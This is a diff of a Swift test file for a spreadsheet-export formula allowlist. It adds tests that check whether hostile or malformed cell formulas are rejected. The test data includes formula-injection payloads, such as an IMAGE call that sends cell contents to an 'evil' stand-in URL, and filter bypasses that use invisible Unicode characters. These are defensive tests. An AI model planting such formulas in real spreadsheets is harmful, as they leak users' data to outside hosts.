@@ -6,13 +6,16 @@ import Testing
 // denylist let IMAGE (exfiltrates by URL), STOCKHISTORY, COPILOT and external
 // references through; the .xlsx writer made any "=" cell a live formula.
 
-@Test func formulaAllowlistTests() {
-    testFetchingAndExternalFormulasAreRejected()
-    testPlainFormulasAreAccepted()
-    testInnocentTextStillPasses()
-    testXLSXWritesFormulasOnlyWhenRequestedAndAllowed()
-    testTheDocumentSpecCarriesTheFormulaRequest()
-}
+@Test func hostileFormulasAreRejected() { testFetchingAndExternalFormulasAreRejected() }
+@Test func plainFormulasAreAccepted() { testPlainFormulasAreAccepted() }
+@Test func innocentTextStillPasses() { testInnocentTextStillPasses() }
+@Test func signedNamesAndInvisibleCharactersAreRejected() { testSignedNamesAndInvisibleCharactersAreRejected() }
+@Test func signedProseIsText() { testSignedProseIsStoredAsText() }
+@Test func malformedFormulasAreRejected() { testMalformedFormulasAreRejected() }
+@Test func namesThatStartLikeABooleanAreRejected() { testNamesThatStartLikeABooleanAreRejected() }
+@Test func everyAllowedFunctionIsAccepted() { testEveryAllowedFunctionIsAccepted() }
+@Test func xlsxFormulasNeedARequestAndTheAllowlist() { testXLSXWritesFormulasOnlyWhenRequestedAndAllowed() }
+@Test func theDocumentSpecCarriesTheFormulaRequest() { testTheDocumentSpecCarriesTheFormulaRequest() }
 
 private func parse(_ cell: String) -> Result<[[SheetCell]], SheetError> {
     SheetValues.parse(any: [[cell]], for: SheetRange(a1: "A1")!)
@@ -55,6 +58,49 @@ func testPlainFormulasAreAccepted() {
 func testInnocentTextStillPasses() {
     for fine in ["-12 grados", "+52 55 1234", "@karen", "hola", #"\\host\share"#] {
         guard case .success = parse(fine) else { return expect(false, "texto inocente rechazado: \(fine)") }
+    }
+}
+
+func testSignedNamesAndInvisibleCharactersAreRejected() {
+    let hostile = [
+        "+SecretName", "-SecretName", "@SecretName(A1)", "+ SecretName", "-SUM(A1)+SecretName",
+        "+IMAGE\u{2060}(\"http://evil/?d=\"&A1)", "+IMAGE\u{200B}(A1)", "+IMAGE\u{00AD}(A1)", "+IMAGE\u{FEFF}(A1)",
+        "=SUM\u{200B}(A1)", "=IMAGE\u{2060}(A1)", "=SUM(A1)\u{0007}", "-12\u{200B}grados",
+    ]
+    for formula in hostile {
+        guard case .failure(let error) = parse(formula) else {
+            return expect(false, "allowlist: aceptada \(formula.debugDescription)")
+        }
+        expectEq(error, .forbiddenFormula, "allowlist: rechazada \(formula.debugDescription)")
+    }
+}
+
+func testSignedProseIsStoredAsText() {
+    for prose in ["- Total (MXN)", "-12 grados", "@karen", "+52 55 1234", "-12", "- pendiente de pago",
+                  "+Total mensual", "+SUM(A1:A2)", "-A1", "@SUM(A1)"] {
+        guard case .success(let cells) = parse(prose) else { return expect(false, "texto rechazado: \(prose)") }
+        expectEq(cells[0][0], .text(prose), "texto: \(prose) queda como texto")
+    }
+}
+
+func testMalformedFormulasAreRejected() {
+    for broken in ["=SUM(", "=", "=\"", "=_xlfn.IMAGE(\"http://evil/x\")", "=IM AGE(A1)", "=SUM(A1", "=1+"] {
+        guard case .failure = parse(broken) else { return expect(false, "allowlist: aceptada \(broken)") }
+    }
+}
+
+func testNamesThatStartLikeABooleanAreRejected() {
+    for name in ["=TRUEA1", "=TRUEX", "=FALSEY+1", "=A1TRUE"] {
+        guard case .failure = parse(name) else { return expect(false, "allowlist: aceptada \(name)") }
+    }
+    for fine in ["=TRUE", "=FALSE", "=IF(TRUE,1,2)", "=A1"] {
+        guard case .success = parse(fine) else { return expect(false, "allowlist: rechazada \(fine)") }
+    }
+}
+
+func testEveryAllowedFunctionIsAccepted() {
+    for name in FormulaPolicy.allowedFunctions.sorted() {
+        guard case .success = parse("=\(name)(A1)") else { return expect(false, "allowlist: \(name) rechazada") }
     }
 }
 
